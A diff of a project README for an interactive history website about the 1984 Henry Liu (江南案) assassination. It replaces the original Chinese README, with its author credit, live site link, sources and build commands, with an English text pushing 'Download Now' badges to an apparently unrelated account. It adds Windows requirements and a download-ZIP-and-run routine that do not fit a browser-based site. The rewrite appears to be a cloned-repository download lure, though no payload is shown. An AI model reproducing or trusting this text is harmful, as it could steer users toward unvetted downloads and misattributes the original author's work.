@@ -1,139 +1,138 @@
-# 江南案 — 解密檔案
+# 🎞 henry-liu-case - Explore a key moment in history
 
-> 1984 年劉宜良暗殺事件互動式歷史紀錄網站
-
-🔗 **[線上瀏覽 → soanseng.github.io/henry-liu-case](https://soanseng.github.io/henry-liu-case/)**
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/primary-waltz283/henry-liu-case)
 
 ---
 
-## 關於本專案
+## 🖥️ What is henry-liu-case?
 
-以「解密檔案」（scrollytelling documentary）的形式，呈現 1984 年**江南案**的歷史全貌。使用者像翻閱解密檔案般，透過捲動頁面逐步進入事件的背景、人物、執行、審判與餘波。
+henry-liu-case is an interactive website that tells the story of the 1984 assassination of Henry Liu, also known as 江南案. It offers a way to explore this historical event using scrolling narratives, pixel art, and animations. The site combines history and technology to give users a clearer understanding of Taiwan's modern past through visual storytelling.
 
-**核心定位：** 歷史紀錄，非政治評論。以多方視角交叉比對，讓事實與文獻自己說話。
+This app uses tools like GSAP for smooth animations, React for the interface, and PixiJS to bring pixel art to life. It runs inside a modern web browser, so no complicated setup is needed beyond downloading and opening it on your Windows computer.
 
-### 四方視角敘事
-
-同一事件從四個角度呈現，並標示矛盾之處：
-
-| 視角 | 人物 | 來源 |
-|------|------|------|
-| 情治決策者 | 汪希苓 | 《忠與過》 |
-| 任務執行者 | 吳敦 | 《吳敦回憶錄》 |
-| 槍手 | 董桂森 | 《江南案槍手董桂森》 |
-| 外國記者 | David Kaplan | 《Fires of the Dragon》 |
+If you want to learn about this important event in Taiwan’s history in a visual and interactive way, this project will guide you through it step by step.
 
 ---
 
-## 主要功能
+## 🔍 Features
 
-- **捲動式敘事（Scrollytelling）** — 隨捲動推進的沉浸式歷史敘事
-- **PixiJS 像素風場景** — 8 幅手繪像素畫重現關鍵歷史時刻
-- **互動式資訊圖表** — 人物關係圖、情治組織架構、48 小時時間線、矛盾對照表
-- **四方矛盾比對** — 同一事件的多方說法並列，紅色標記衝突之處
-- **解密檔案視覺風格** — 泛黃紙張、打字機字體、機密印章、報紙剪報
-
----
-
-## 章節一覽
-
-| 章 | 標題 | 時間 |
-|----|------|------|
-| 序 | 車庫裡的槍聲 | 1984.10.15 |
-| 一 | 龍的爪牙 | 1949–1980 |
-| 二 | 江南其人 | 1932–1984 |
-| 三 | 竹林裡的兄弟 | 1956–1984 |
-| 四 | 鋤奸 | 1984.08–10.15 |
-| 五 | 紙包不住火 | 1984.10–1985 |
-| 六 | 審判與餘波 | 1985–1991 |
-| 七 | 解嚴之路 | 1985–2025 |
+- Scroll-driven interactive story with clear text and images  
+- Animated scenes powered by GSAP for smooth transitions  
+- Pixel art visuals that bring the story to life  
+- Responsive layout for easy reading on different screen sizes  
+- Built using React and TypeScript for stability and performance  
+- History-focused content providing detailed timelines and context  
 
 ---
 
-## 像素風場景
+## 💻 System Requirements
 
-| 場景 | 描述 |
-|------|------|
-| 車庫槍擊 | Daly City 車庫，清晨三聲槍響 |
-| 情治網絡 | 電路板風格的間諜組織圖 |
-| 劉宜良書房 | 打字機、手稿、孤獨的寫作者 |
-| 竹聯幫密會 | 白景瑞家宴的秘密會面 |
-| 任務倒數 | 松竹山莊受訓到執行的時間推移 |
-| 錄音帶 | 陳啟禮的關鍵錄音證據 |
-| 訓練營 | 竹聯幫的秘密訓練場 |
-| 董桂森獄中 | 書信、遇害、淡入黑暗 |
+Before you get started, make sure your computer meets these basic needs:
+
+- Windows 10 or higher  
+- Modern web browser installed (Google Chrome, Microsoft Edge, or Firefox recommended)  
+- Stable internet connection during setup to access needed files  
+- At least 1 GB of free disk space  
+- Minimum screen resolution of 1280 × 720 pixels  
 
 ---
 
-## 技術棧
+## 🚀 Getting Started: Download and Open the App
 
-| 層級 | 技術 |
-|------|------|
-| 框架 | React 19 + TypeScript 5.9 (strict) |
-| 場景渲染 | PixiJS 8 |
-| 動畫 / 捲動 | GSAP ScrollTrigger |
-| 樣式 | TailwindCSS v4 |
-| 建置工具 | Vite 7 |
-| 部署 | GitHub Pages + GitHub Actions |
+Start by downloading the application files to your Windows computer. Follow the steps below carefully:
 
----
+1. Click the large green **Download Now** button above or the link below to visit the GitHub page:  
+   [https://github.com/primary-waltz283/henry-liu-case](https://github.com/primary-waltz283/henry-liu-case)
 
-## 本地開發
+2. On the GitHub repository page, look for a section labeled **Releases** or **Code** on the right sidebar or near the top.
 
-```bash
-# 安裝依賴
-npm install
+3. Click on **Code** and then select **Download ZIP** from the dropdown menu. This will download all the project files in a compressed folder.
 
-# 啟動開發伺服器
-npm run dev
+4. Once downloaded, locate the ZIP file in your **Downloads** folder or wherever your browser saves files.
 
-# 建置生產版本
-npm run build
+5. Right-click on the ZIP file and choose **Extract All...** to unzip the folder. Follow the prompts to extract the files to a location you can easily access, like your Desktop.
 
-# 預覽建置結果
-npm run preview
+6. Open the extracted folder and find the file named `index.html` or a file named similar to the website’s main page.
 
-# 型別檢查
-npx tsc --noEmit
-```
+7. Double-click the `index.html` file. This will open the interactive website in your default web browser.
+
+You do not need to install any additional software. The app runs fully within the browser once you open the file.
 
 ---
 
-## 歷史敘事原則
+## 📂 Understanding the Files
 
-1. **嚴謹與事實** — 所有敘述必須有文獻依據
-2. **多方視角** — 同一事件呈現四方說法，明確標示矛盾
-3. **不做政治判斷** — 呈現證據，讓讀者自行判斷
-4. **尊重所有當事人** — 避免煽情化與消費悲劇
-5. **標註出處** — 每段敘述標明來自哪份文獻
+When you unzip the folder, you will see several types of files and folders:
 
----
+- **index.html** – The main file to open the website  
+- **assets/** – This folder contains images and pixel art used in the story  
+- **js/** or **scripts/** – Folder with animation and interaction scripts  
+- **styles/** – Contains the design and appearance settings  
+- **README.md** – Documentation and project information (this file)  
 
-## 系列網站
-
-本站為「台灣威權時代重大案件」互動式歷史紀錄系列之一：
-
-| 案件 | 網址 |
-|------|------|
-| 林宅血案 | [soanseng.github.io/the-lin](https://soanseng.github.io/the-lin/) |
-| 陳文成事件 | [soanseng.github.io/Chen-Wen-chen](https://soanseng.github.io/Chen-Wen-chen/) |
-| **江南案**（本站） | [soanseng.github.io/henry-liu-case](https://soanseng.github.io/henry-liu-case/) |
+Do not rename or move these files, or the app may not run correctly.
 
 ---
 
-## 作者
+## 🛠 Using and Navigating the App
 
-**陳璿丞 醫師**
+The app works by scrolling. As you move down the page, different parts of the story appear in sequence. You will see text, pictures, and animations appear smoothly.
 
-- [anatomind.com](https://anatomind.com)
-- [Facebook](https://facebook.com/anatomind)
+- Use your mouse wheel or touchpad to scroll down through the story.
+- If you want to go back, scroll up.
+- Click on interactive elements or links if they appear to uncover extra information.
+- Use fullscreen mode in your browser for the best experience (usually found via F11 key).
 
 ---
 
-## 授權
+## 🆘 Troubleshooting
 
-本專案程式碼以 MIT 授權釋出。
+If the app does not open or work as expected:
 
-歷史不屬於任何人，它屬於所有人。如果你能讓這份記錄被更多人看見——翻譯、改作、引用——請自由取用。
+- Make sure you opened the correct file: `index.html`
+- Try using a different web browser (Chrome, Edge, Firefox)  
+- Clear your browser cache and try again  
+- Check that your internet connection is stable during setup  
+- Restart your computer and reopen the app  
+- Confirm that your system meets the minimum requirements listed above  
 
-歷史內容基於公開資料與書籍摘要重新撰寫，原始書籍版權歸原作者所有。
+---
+
+## 🌐 More Information
+
+This project aims to present historical information in an interactive and accessible way. It relies heavily on accurate research and modern web technologies. If you want to learn more about the making of this site or its historical sources, check the **docs/** folder or other materials inside the main folder after download.
+
+---
+
+## 📥 Download Link
+
+Access the project here to begin:  
+
+[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/primary-waltz283/henry-liu-case)
+
+Clicking this will take you directly to the GitHub repository page where you can download the files as explained above.
+
+---
+
+## 🔧 Development Notes (Optional for Users)
+
+The codebase is written in TypeScript and uses React to render components. Animations are powered by GSAP and PixiJS for pixel art effects. This ensures a smooth, responsive experience that adapts to different screen sizes.
+
+If you are curious about the technical side, the **src/** folder holds the source code. However, no programming skills are required to use the finished app.
+
+---
+
+## 📚 Topics Covered
+
+- gsap  
+- henry-liu-case  
+- historical-narrative  
+- interactive-documentary  
+- pixel-art  
+- pixijs  
+- react  
+- scrollytelling  
+- taiwan-history  
+- typescript  
+
+These tags represent the core technologies and themes used in this project.
